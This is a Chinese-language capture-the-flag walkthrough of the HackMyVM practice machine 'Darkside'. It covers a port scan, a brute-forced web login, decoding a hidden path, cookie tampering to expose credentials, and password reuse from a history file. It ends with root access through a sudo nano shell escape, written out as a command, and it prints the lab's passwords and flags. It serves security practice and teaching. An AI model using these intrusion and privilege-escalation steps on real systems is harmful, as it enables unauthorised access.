# Darkside

2025.02.22 https://hackmyvm.eu/machines/machine.php?vm=Darkside

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 web 首页显示登陆页面，扫描发现 http://192.168.5.40/backup/vote.txt

```
rijaba: Yes
xerosec: Yes
sml: No
cromiphi: No
gatogamer: No
chema: Yes
talleyrand: No
d3b0o: Yes

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
```

得到用户名 kevin ， 上面的几个单词可能是密码，尝试爆破登陆但是不对，使用另外的一个小字典，结果爆破出了登陆密码 iloveyou 登陆到系统，显示一串字符 kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC 是先 base64 在 base58 编码的，将其解码后得到 sfqekmgncutjhbypvxda.onion

将该域名添加到 hosts 文件中当作域名，重新扫描，但是结果一样。

也可能是一个路径名，尝试访问 http://192.168.5.40/sfqekmgncutjhbypvxda.onion 查看源码发现：

```
var sideCookie = document.cookie.match(/(^| )side=([^;]+)/);
    if (sideCookie && sideCookie[2] === 'darkside') {
        window.location.href = 'hwvhysntovtanj.password';
    }
```

F12 修改 cookie side=darkside 刷新后 跳转到了 http://192.168.5.40/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password 显示了 kevin 的登陆凭据：kevin:ILoveCalisthenics

使用此凭据进行 ssh 登陆，拿到 user flag：

```
kevin@darkside:~$ cat user.txt
UnbelievableHumble
```

查看到当前目录的 .history 文件，发现另外一个用户和密码: rijaba:ILoveJabita ，su 切换到 rijaba，sudo -l 显示 (root) NOPASSWD: /usr/bin/nano 直接可以拿到 root 权限：

```
sudo nano
^R^X
reset; sh 1>&0 2>&0

cd /root
cat root.txt

# cat root.txt
  ██████╗░░█████╗░██████╗░██╗░░██╗░██████╗██╗██████╗░███████╗
  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██║██╔══██╗██╔════╝
  ██║░░██║███████║██████╔╝█████═╝░╚█████╗░██║██║░░██║█████╗░░
  ██║░░██║██╔══██║██╔══██╗██╔═██╗░░╚═══██╗██║██║░░██║██╔══╝░░
  ██████╔╝██║░░██║██║░░██║██║░╚██╗██████╔╝██║██████╔╝███████╗
  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░╚══════╝


youcametothedarkside
```
